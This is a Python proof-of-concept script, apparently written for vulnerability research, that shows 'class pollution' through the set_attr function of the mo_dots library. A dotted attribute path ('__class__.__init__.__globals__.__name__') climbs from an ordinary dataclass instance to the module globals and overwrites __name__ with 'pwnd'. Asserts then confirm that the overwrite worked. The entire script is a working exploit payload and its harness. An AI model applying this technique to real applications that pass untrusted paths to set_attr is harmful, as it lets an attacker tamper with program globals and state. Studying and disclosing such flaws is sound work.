# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: set_attr
# Type: get-attr-set-attr

from mo_dots import set_attr
from dataclasses import dataclass

@dataclass
class Target:
  dummy: str = "hello"

target = Target()

payload_value = "pwnd"
PAYLOAD = "__class__.__init__.__globals__.__name__"

def run_poc():
  set_attr(target, PAYLOAD, payload_value)

def verify_poc():
  assert __name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: __name__ = {__name__}")
  assert __name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
